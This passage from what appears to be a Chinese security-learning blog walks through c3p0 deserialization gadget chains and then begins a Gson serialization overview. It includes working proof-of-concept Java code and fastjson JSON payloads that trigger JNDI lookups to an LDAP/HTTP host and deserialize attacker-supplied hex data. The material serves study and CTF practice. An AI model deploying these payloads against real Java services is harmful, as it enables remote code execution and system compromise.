<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> com.mchange.v2.c3p0.impl.PoolBackedDataSourceBase;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.naming.NamingException;</span><br><span class="line"><span class="keyword">import</span> javax.naming.Reference;</span><br><span class="line"><span class="keyword">import</span> javax.naming.Referenceable;</span><br><span class="line"><span class="keyword">import</span> javax.sql.ConnectionPoolDataSource;</span><br><span class="line"><span class="keyword">import</span> javax.sql.PooledConnection;</span><br><span class="line"><span class="keyword">import</span> java.beans.PropertyVetoException;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.sql.SQLException;</span><br><span class="line"><span class="keyword">import</span> java.sql.SQLFeatureNotSupportedException;</span><br><span class="line"><span class="keyword">import</span> java.util.logging.Logger;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">C3P0</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> PropertyVetoException, IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">PoolBackedDataSourceBase</span> <span class="variable">a</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PoolBackedDataSourceBase</span>(<span class="literal">false</span>);</span><br><span class="line">        a.setConnectionPoolDataSource(<span class="keyword">new</span> <span class="title class_">Source</span>());</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">barr</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(barr);</span><br><span class="line">        oos.writeObject(a);</span><br><span class="line">        oos.close();</span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">in</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(barr.toByteArray());</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(in);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">ob</span> <span class="operator">=</span> ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">Source</span> <span class="keyword">implements</span> <span class="title class_">ConnectionPoolDataSource</span>, Referenceable &#123;</span><br><span class="line">        <span class="keyword">public</span> Reference <span class="title function_">getReference</span> <span class="params">()</span> <span class="keyword">throws</span> NamingException &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Reference</span>(<span class="string">&quot;baicany&quot;</span>, <span class="string">&quot;baicany&quot;</span>, <span class="string">&quot;http://127.0.0.1:8888/ &quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">public</span> PrintWriter <span class="title function_">getLogWriter</span> <span class="params">()</span> <span class="keyword">throws</span> SQLException &#123;<span class="keyword">return</span> <span class="literal">null</span>;&#125;</span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setLogWriter</span> <span class="params">( PrintWriter out )</span> <span class="keyword">throws</span> SQLException &#123;&#125;</span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setLoginTimeout</span> <span class="params">( <span class="type">int</span> seconds )</span> <span class="keyword">throws</span> SQLException &#123;&#125;</span><br><span class="line">        <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getLoginTimeout</span> <span class="params">()</span> <span class="keyword">throws</span> SQLException &#123;<span class="keyword">return</span> <span class="number">0</span>;&#125;</span><br><span class="line">        <span class="keyword">public</span> Logger <span class="title function_">getParentLogger</span> <span class="params">()</span> <span class="keyword">throws</span> SQLFeatureNotSupportedException &#123;<span class="keyword">return</span> <span class="literal">null</span>;&#125;</span><br><span class="line">        <span class="keyword">public</span> PooledConnection <span class="title function_">getPooledConnection</span> <span class="params">()</span> <span class="keyword">throws</span> SQLException &#123;<span class="keyword">return</span> <span class="literal">null</span>;&#125;</span><br><span class="line">        <span class="keyword">public</span> PooledConnection <span class="title function_">getPooledConnection</span> <span class="params">( String user, String password )</span> <span class="keyword">throws</span> SQLException &#123;<span class="keyword">return</span> <span class="literal">null</span>;&#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="利用本地⼯⼚"><a href="#利用本地⼯⼚" class="headerlink" title="利用本地⼯⼚"></a>利用本地⼯⼚</h3><p>当⽬标环境不出⽹时，URLClassLoader加载类的⽅式将不能利⽤</p>
<p>ReferenceableUtils.referenceToObject⽅法后紧跟调⽤getObjectInstance⽅法，可尝试利⽤本地⼯⼚</p>
<h3 id="调用链"><a href="#调用链" class="headerlink" title="调用链"></a>调用链</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">PoolBackedDataSourceBase.readObject-&gt;</span><br><span class="line">    ReferenceIndirector$ReferenceSerialized.getObject-&gt;</span><br><span class="line">    	ReferenceableUtils.referenceToObject</span><br></pre></td></tr></table></figure>

<h2 id="jndi注入"><a href="#jndi注入" class="headerlink" title="jndi注入"></a>jndi注入</h2><p>定位到com.mchange.v2.c3p0.JndiRefForwardingDataSource#dereference⽅法，⽅法能触发JNDI请求</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> DataSource <span class="title function_">dereference</span><span class="params">()</span> <span class="keyword">throws</span> SQLException &#123;</span><br><span class="line">    <span class="type">Object</span> <span class="variable">jndiName</span> <span class="operator">=</span> <span class="built_in">this</span>.getJndiName();</span><br><span class="line">    <span class="type">Hashtable</span> <span class="variable">jndiEnv</span> <span class="operator">=</span> <span class="built_in">this</span>.getJndiEnv();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        InitialContext ctx;</span><br><span class="line">        <span class="keyword">if</span> (jndiEnv != <span class="literal">null</span>) &#123;</span><br><span class="line">            ctx = <span class="keyword">new</span> <span class="title class_">InitialContext</span>(jndiEnv);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            ctx = <span class="keyword">new</span> <span class="title class_">InitialContext</span>();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (jndiName <span class="keyword">instanceof</span> String) &#123;</span><br><span class="line">            <span class="keyword">return</span> (DataSource)ctx.lookup((String)jndiName);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (jndiName <span class="keyword">instanceof</span> Name) &#123;</span><br><span class="line">            <span class="keyword">return</span> (DataSource)ctx.lookup((Name)jndiName);</span><br></pre></td></tr></table></figure>

<p>通过lookup来造成jndi注入，而这里jndiname是通过get方法获取的</p>
<p>只有inner⽅法调⽤了这个⽅法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">synchronized</span> DataSource <span class="title function_">inner</span><span class="params">()</span> <span class="keyword">throws</span> SQLException &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">this</span>.cachedInner != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.cachedInner;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="type">DataSource</span> <span class="variable">out</span> <span class="operator">=</span> <span class="built_in">this</span>.dereference();</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">this</span>.isCaching()) &#123;</span><br><span class="line">            <span class="built_in">this</span>.cachedInner = out;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> out;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>需要满⾜cachedInner为null，这些⽅法调⽤了inner⽅法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Connection <span class="title function_">getConnection</span><span class="params">()</span> <span class="keyword">throws</span> SQLException &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">this</span>.inner().getConnection();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> Connection <span class="title function_">getConnection</span><span class="params">(String username, String password)</span> <span class="keyword">throws</span> SQLException &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">this</span>.inner().getConnection(username, password);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> PrintWriter <span class="title function_">getLogWriter</span><span class="params">()</span> <span class="keyword">throws</span> SQLException &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">this</span>.inner().getLogWriter();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setLogWriter</span><span class="params">(PrintWriter out)</span> <span class="keyword">throws</span> SQLException &#123;</span><br><span class="line">    <span class="built_in">this</span>.inner().setLogWriter(out);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getLoginTimeout</span><span class="params">()</span> <span class="keyword">throws</span> SQLException &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">this</span>.inner().getLoginTimeout();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setLoginTimeout</span><span class="params">(<span class="type">int</span> seconds)</span> <span class="keyword">throws</span> SQLException &#123;</span><br><span class="line">    <span class="built_in">this</span>.inner().setLoginTimeout(seconds);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>现在就是想办法调⽤这些⽅法</p>
<p>由于这个类没有被public修饰，外部是⽆法实例化的（本想利⽤CB链调⽤getter⽅法）</p>
<p>在com.mchange.v2.c3p0.JndiRefConnectionPoolDataSource类中出现了JndiRefForwardingDataSource的⾝影</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">JndiRefConnectionPoolDataSource</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>(<span class="literal">true</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="title function_">JndiRefConnectionPoolDataSource</span><span class="params">(<span class="type">boolean</span> autoregister)</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>.jrfds = <span class="keyword">new</span> <span class="title class_">JndiRefForwardingDataSource</span>();</span><br><span class="line">    <span class="built_in">this</span>.wcpds = <span class="keyword">new</span> <span class="title class_">WrapperConnectionPoolDataSource</span>();</span><br><span class="line">    <span class="built_in">this</span>.wcpds.setNestedDataSource(<span class="built_in">this</span>.jrfds);</span><br><span class="line">    <span class="keyword">if</span> (autoregister) &#123;</span><br><span class="line">        <span class="built_in">this</span>.identityToken = C3P0ImplUtils.allocateIdentityToken(<span class="built_in">this</span>);</span><br><span class="line">        C3P0Registry.reregister(<span class="built_in">this</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>所以找找能调用JndiRefForwardingDataSource的set和get方法</p>
<p>但是发现是WrapperConnectionPoolDataSource对象的⽅法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> PrintWriter <span class="title function_">getLogWriter</span><span class="params">()</span> <span class="keyword">throws</span> SQLException &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">this</span>.wcpds.getLogWriter();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setLogWriter</span><span class="params">(PrintWriter out)</span> <span class="keyword">throws</span> SQLException &#123;</span><br><span class="line">    <span class="built_in">this</span>.wcpds.setLogWriter(out);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setLoginTimeout</span><span class="params">(<span class="type">int</span> seconds)</span> <span class="keyword">throws</span> SQLException &#123;</span><br><span class="line">    <span class="built_in">this</span>.wcpds.setLoginTimeout(seconds);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getLoginTimeout</span><span class="params">()</span> <span class="keyword">throws</span> SQLException &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">this</span>.wcpds.getLoginTimeout();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>跟进这些方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> PrintWriter <span class="title function_">getLogWriter</span><span class="params">()</span> <span class="keyword">throws</span> SQLException &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">this</span>.getNestedDataSource().getLogWriter();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setLogWriter</span><span class="params">(PrintWriter out)</span> <span class="keyword">throws</span> SQLException &#123;</span><br><span class="line">    <span class="built_in">this</span>.getNestedDataSource().setLogWriter(out);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setLoginTimeout</span><span class="params">(<span class="type">int</span> seconds)</span> <span class="keyword">throws</span> SQLException &#123;</span><br><span class="line">    <span class="built_in">this</span>.getNestedDataSource().setLoginTimeout(seconds);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getLoginTimeout</span><span class="params">()</span> <span class="keyword">throws</span> SQLException &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">this</span>.getNestedDataSource().getLoginTimeout();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>再跟进getNestedDataSource方法</p>
<p>发现返回的对象其实是JndiRefForwardingDataSource因为wcpds.setNestedDataSource(this.jrfds)</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">synchronized</span> DataSource <span class="title function_">getNestedDataSource</span><span class="params">()</span> &#123;</span><br><span class="line">     <span class="keyword">return</span> <span class="built_in">this</span>.nestedDataSource;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>

<p>所以只有触发对应任意一个set get方法就能调⽤到</p>
<p>com.mchange.v2.c3p0.JndiRefForwardingDataSource#dereference⽅法</p>
<p>其次我们还需要控制jndiName，其来源于getJndiName⽅法</p>
<p>好巧不巧，JndiRefConnectionPoolDataSource⼜提供了setJndiName⽅法，正好调⽤JndiRefForwardingDataSource的setJndiName⽅法</p>
<p>所以我们需要在反序列化中先后调⽤setJndiName和触发到JNDI⼊⼝的setter或getter⽅法，在fastjson环境下有类似操作</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JNDI</span> &#123;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"><span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;com.mchange.v2.c3p0.JndiRefConnectionPoolDataSource\&quot;,&quot;</span> +</span><br><span class="line"><span class="string">&quot;\&quot;jndiName\&quot;:\&quot;ldap://localhost:8888/baicany\&quot;,\&quot;loginTimeout\&quot;:\&quot;1\&quot;&#125;&quot;</span>;</span><br><span class="line">JSON.parse(payload);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="调用链-1"><a href="#调用链-1" class="headerlink" title="调用链"></a>调用链</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">JndiRefConnectionPoolDataSource#setxxx-&gt;</span><br><span class="line">	WrapperConnectionPoolDataSource#setxxx-&gt;</span><br><span class="line">    	com.mchange.v2.c3p0.JndiRefForwardingDataSource#setxxx-&gt;</span><br><span class="line">    		com.mchange.v2.c3p0.JndiRefForwardingDataSource#inner-&gt;</span><br><span class="line">    			com.mchange.v2.c3p0.JndiRefForwardingDataSource#dereference</span><br></pre></td></tr></table></figure>

<h2 id="Hex反序列化"><a href="#Hex反序列化" class="headerlink" title="Hex反序列化"></a>Hex反序列化</h2><p>定位到com.mchange.v2.c3p0.WrapperConnectionPoolDataSource类构造⽅法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">WrapperConnectionPoolDataSource</span><span class="params">(<span class="type">boolean</span> autoregister)</span> &#123;</span><br><span class="line">    <span class="built_in">super</span>(autoregister);</span><br><span class="line">    <span class="built_in">this</span>.connectionTester = C3P0Registry.getDefaultConnectionTester();</span><br><span class="line">    <span class="built_in">this</span>.setUpPropertyListeners();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.userOverrides = C3P0ImplUtils.parseUserOverridesAsString(<span class="built_in">this</span>.getUserOverridesAsString());</span><br><span class="line">    &#125; </span><br></pre></td></tr></table></figure>

<p>根据parseUserOverridesAsString方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Map <span class="title function_">parseUserOverridesAsString</span><span class="params">(String userOverridesAsString)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">    <span class="keyword">if</span> (userOverridesAsString != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">hexAscii</span> <span class="operator">=</span> userOverridesAsString.substring(<span class="string">&quot;HexAsciiSerializedMap&quot;</span>.length() + <span class="number">1</span>, userOverridesAsString.length() - <span class="number">1</span>);</span><br><span class="line">        <span class="type">byte</span>[] serBytes = ByteUtils.fromHexAscii(hexAscii);</span><br><span class="line">        <span class="keyword">return</span> Collections.unmodifiableMap((Map)SerializableUtils.fromByteArray(serBytes));</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> Collections.EMPTY_MAP;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>当userOverridesAsString不为null时候会截取一个字符串,然后将它hex解码,然后会调⽤⽅法SerializableUtils.fromByteArray⽅法</p>
<p>跟进这个方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">fromByteArray</span><span class="params">(<span class="type">byte</span>[] var0)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">    <span class="type">Object</span> <span class="variable">var1</span> <span class="operator">=</span> deserializeFromByteArray(var0);</span><br><span class="line">    <span class="keyword">return</span> var1 <span class="keyword">instanceof</span> IndirectlySerialized ? ((IndirectlySerialized)var1).getObject() : var1;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">deserializeFromByteArray</span><span class="params">(<span class="type">byte</span>[] var0)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">    <span class="type">ObjectInputStream</span> <span class="variable">var1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(var0));</span><br><span class="line">    <span class="keyword">return</span> var1.readObject();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>发现这里进行了一次反序列化</p>
<p>所以只需要控制var0为我们要反序列化的恶意对象即可，所以我们要逆推出getUserOverridesAsString⽅法的返回结果</p>
<p>所以需要其他依赖反序列化这个内容,但是我想要是没有其他依赖会怎么样,像ctf赛那样本身禁用了初始化类,能不能本身调用jndi链呢,理论上应该是可以的</p>
<p>ByteUtils也提供了字节数字转hex的操作,但是由于之前那个字符串截取的问题所以要加上头部和尾部一个字符,这里xxx可以用成cc链</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">HASM_HEADER</span> <span class="operator">=</span> <span class="string">&quot;HexAsciiSerializedMap:&quot;</span>;</span><br><span class="line"><span class="type">byte</span>[] exp = Base64.getDecoder().decode(<span class="string">&quot;xxx&quot;</span>);</span><br><span class="line"><span class="type">String</span> <span class="variable">hex</span> <span class="operator">=</span> ByteUtils.toHexAscii(exp);</span><br><span class="line"><span class="type">String</span> <span class="variable">fullhex</span> <span class="operator">=</span> HASM_HEADER + hex + <span class="string">&quot;;&quot;</span>;</span><br></pre></td></tr></table></figure>

<p>但是构造方法并不能设定这个UserOverridesAsString,所以得其他方法来触发parseUserOverridesAsString方法</p>
<p>发现其还有setter⽅法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">synchronized</span> <span class="keyword">void</span> <span class="title function_">setUserOverridesAsString</span><span class="params">(String userOverridesAsString)</span> <span class="keyword">throws</span> PropertyVetoException &#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">oldVal</span> <span class="operator">=</span> <span class="built_in">this</span>.userOverridesAsString;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">this</span>.eqOrBothNull(oldVal, userOverridesAsString)) &#123;</span><br><span class="line">        <span class="built_in">this</span>.vcs.fireVetoableChange(<span class="string">&quot;userOverridesAsString&quot;</span>, oldVal, userOverridesAsString);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">this</span>.userOverridesAsString = userOverridesAsString;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>跟进fireVetoableChange方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">fireVetoableChange</span><span class="params">(String propertyName, Object oldValue, Object newValue)</span></span><br><span class="line">        <span class="keyword">throws</span> PropertyVetoException &#123;</span><br><span class="line">    <span class="keyword">if</span> (oldValue == <span class="literal">null</span> || newValue == <span class="literal">null</span> || !oldValue.equals(newValue)) &#123;</span><br><span class="line">        fireVetoableChange(<span class="keyword">new</span> <span class="title class_">PropertyChangeEvent</span>(<span class="built_in">this</span>.source, propertyName, oldValue, newValue));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>发现当这里传入的由于oldVal为null，就会调用fireVetoableChange方法,继续跟进</p>
<p><img src="https://baicany.github.io/images/image-20230831164714202.png" alt="image-20230831164714202"></p>
<p>listeners[current] 这⾥会取出WrapperConnectionPoolDataSource对象，跟进vetoableChange⽅法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">vetoableChange</span><span class="params">(PropertyChangeEvent evt)</span> <span class="keyword">throws</span> PropertyVetoException &#123;</span><br><span class="line">              <span class="type">String</span> <span class="variable">propName</span> <span class="operator">=</span> evt.getPropertyName();</span><br><span class="line">              <span class="type">Object</span> <span class="variable">val</span> <span class="operator">=</span> evt.getNewValue();</span><br><span class="line">              <span class="keyword">if</span> (<span class="string">&quot;connectionTesterClassName&quot;</span>.equals(propName)) &#123;</span><br><span class="line">                  <span class="keyword">try</span> &#123;</span><br><span class="line">                      WrapperConnectionPoolDataSource.<span class="built_in">this</span>.recreateConnectionTester((String)val);</span><br><span class="line">                  &#125;..</span><br><span class="line">              <span class="keyword">else</span> <span class="keyword">if</span> (<span class="string">&quot;userOverridesAsString&quot;</span>.equals(propName)) &#123;</span><br><span class="line">                  <span class="keyword">try</span> &#123;</span><br><span class="line">                      WrapperConnectionPoolDataSource.<span class="built_in">this</span>.userOverrides = C3P0ImplUtils.parseUserOverridesAsString((String)val);</span><br><span class="line">                  &#125; </span><br></pre></td></tr></table></figure>

<p>发现如果这里propName为userOverridesAsString,就会触发parseUserOverridesAsString方法了,而里面的值是我们设定的值</p>
<p>所以写payload</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example.serialize.c3p0;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.mchange.lang.ByteUtils;</span><br><span class="line"><span class="keyword">import</span> com.mchange.v2.c3p0.WrapperConnectionPoolDataSource;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">C3P0Hex</span> &#123;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"><span class="type">byte</span>[] exp = Base64.getDecoder().decode(<span class="string">&quot;baicany xxx&quot;</span>);</span><br><span class="line"><span class="type">String</span> <span class="variable">hex</span> <span class="operator">=</span> ByteUtils.toHexAscii(exp);</span><br><span class="line"><span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span> <span class="string">&quot;&#123;&quot;</span> +</span><br><span class="line"><span class="string">&quot;\&quot;@type\&quot;:\&quot;com.mchange.v2.c3p0.WrapperConnectionPoolDataSource\&quot;,&quot;</span> +</span><br><span class="line"><span class="string">&quot;\&quot;userOverridesAsString\&quot;:\&quot;HexAsciiSerializedMap:&quot;</span>+ hex + <span class="string">&quot;;\&quot;,&quot;</span> +</span><br><span class="line"><span class="string">&quot;&#125;&quot;</span>;</span><br><span class="line">JSON.parse(payload);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="调用链-2"><a href="#调用链-2" class="headerlink" title="调用链"></a>调用链</h2><p>因为WrapperConnectionPoolDataSource类并没有写set方法所以真的的反序列化应该是父类的setUserOverridesAsString方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">WrapperConnectionPoolDataSource#setUserOverridesAsString-&gt;</span><br><span class="line">	WrapperConnectionPoolDataSourceBase#setUserOverridesAsString-&gt;</span><br><span class="line">		VetoableChangeSupport#fireVetoableChange-&gt;</span><br><span class="line">    		VetoableChangeSupport#fireVetoableChange-&gt;</span><br><span class="line">    			WrapperConnectionPoolDataSource#vetoableChange-&gt;</span><br><span class="line">    				 C3P0ImplUtils#parseUserOverridesAsString-&gt;</span><br><span class="line">    				  	SerializableUtils#fromByteArray-&gt;</span><br><span class="line">    					SerializableUtils#deserializeFromByteArray</span><br></pre></td></tr></table></figure>



]]></content>
      <categories>
        <category>学习记录</category>
      </categories>
      <tags>
        <tag>web</tag>
      </tags>
  </entry>
  <entry>
    <title>java Gson</title>
    <url>/2023/11/01/Gson/</url>
    <content><![CDATA[<h3 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h3><p>Gson 是⼀个 Java 库，可⽤于将 Java 对象转换为其 JSON 表⽰形式。它还可⽤于将 JSON 字符串转换为等效的 Java 对象 </p>
<p>Gson 可以处理任意 Java 对象，包括您没有源代码的预先存在的对象 </p>
<p>用户⼿册：<a href="https://github.com/google/gson/blob/main/UserGuide.md">https://github.com/google/gson/blob/main/UserGuide.md</a></p>
<h3 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h3><p>JDK：11.0.19<br>Gson：2.10.1 </p>
<h3 id="序列化和反序列化"><a href="#序列化和反序列化" class="headerlink" title="序列化和反序列化"></a>序列化和反序列化</h3><h4 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h4><p>最主要的是使⽤Gson这个类，你可以通过<code>new Gson()</code> 来实例化这个类。还有⼀个 GsonBuilder类，可⽤于创建具有各种设置（如版本控制等）的 Gson 实例。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Gson gson=<span class="keyword">new</span> <span class="title class_">Gson</span>();</span><br></pre></td></tr></table></figure>

<h4 id="序列化-Gson"><a href="#序列化-Gson" class="headerlink" title="序列化 Gson"></a>序列化 Gson</h4><p>提供toJson⽅法来进⾏序列化 gson.toJson(new Person(“nivia”, “18”)) 反序列化 Gson提供fromJson⽅法来进⾏反序列化，它不像fastjson可以通过@type来判断实例化类 类型，Gson需要直接提供实例化类型的Clas作为类型判断 </p>
<p><code>gson.fromJson(&quot;Json&quot;,Person.class)</code></p>
<h4 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h4><h5 id="序列化"><a href="#序列化" class="headerlink" title="序列化"></a>序列化</h5><p>在前⾯，通过些许尝试就可以发现，Gson是通过实例化触发对应构造⽅法来构造 Json，这⾥作详细分析 这⾥测试的类直接⽤N1CTF中的Person类 </p>
<p><code>gson.toJson(new Person(&quot;baicany&quot;, &quot;18&quot;))</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> String <span class="title function_">toJson</span><span class="params">(Object src)</span> &#123;</span><br><span class="line">  <span class="keyword">if</span> (src == <span class="literal">null</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> toJson(JsonNull.INSTANCE);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> toJson(src, src.getClass());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>先判断序列化对象是否为null,是null会给JsonNull这个对象,然后又进下个</p>
<p>如果不是，则会获取对应Class，然后调用另⼀个构造方法</p>
<p>跟进到另外一个构造方法方法</p>
